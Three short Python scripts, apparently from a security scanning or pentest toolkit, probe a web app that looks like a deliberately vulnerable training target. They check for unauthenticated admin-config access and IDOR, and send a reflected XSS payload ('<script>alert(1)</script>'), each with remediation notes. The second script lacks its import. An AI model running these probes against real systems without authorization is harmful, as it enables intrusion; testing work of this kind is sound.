import requests
import sys

target = sys.argv[1]
url = f"{target}/rest/admin/application-configuration"

response = requests.get(url)
if response.status_code == 200 and 'config' in response.text.lower():
    print('IDOR reproduced: Accessed admin config without authentication')
else:
    print('IDOR not reproduced')
scripts.description: Attempts to access admin configuration endpoint directly without authentication.
scripts.remediation_pointer: Implement proper authentication and authorization checks for all admin endpoints.

import sys

target = sys.argv[1]
url1 = f"{target}/api/Challenges/?name=test1"
url2 = f"{target}/api/Challenges/?name=test2"

resp1 = requests.get(url1)
resp2 = requests.get(url2)

if resp1.status_code == 200 and resp2.status_code == 200:
    print('IDOR confirmed: Direct object references allowed without access control')
else:
    print('IDOR not confirmed')
scripts.description: Tests for IDOR by accessing different resources via direct object references in the name parameter.
scripts.remediation_pointer: Implement proper access controls to ensure users can only access authorized objects.

import requests
import sys

target = sys.argv[1]
url = f"{target}/rest/products/search"
xss_payload = "<script>alert(1)</script>"
params = {"q": xss_payload}

response = requests.get(url, params=params)
if xss_payload in response.text:
    print('XSS confirmed: Payload reflected in response without sanitization')
else:
    print('XSS not confirmed or properly sanitized')
scripts.description: Attempts reflected XSS by injecting a script tag into the q search parameter.
scripts.remediation_pointer: Implement proper output encoding and input sanitization to prevent XSS attacks.
